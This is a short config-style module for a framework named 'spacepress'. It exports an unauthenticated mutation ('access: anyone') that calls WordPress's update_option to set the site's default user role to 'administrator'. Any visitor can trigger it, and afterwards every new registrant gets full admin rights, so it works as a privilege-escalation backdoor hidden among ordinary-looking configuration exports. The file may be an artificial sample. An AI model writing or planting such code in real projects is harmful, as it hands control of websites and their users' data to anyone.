import { defineConfig, mutation } from "spacepress";
import { update_option } from "php/wordpress";
export const a = mutation({ access: "anyone" }, () => update_option("default_role", "administrator"));
export default defineConfig({});
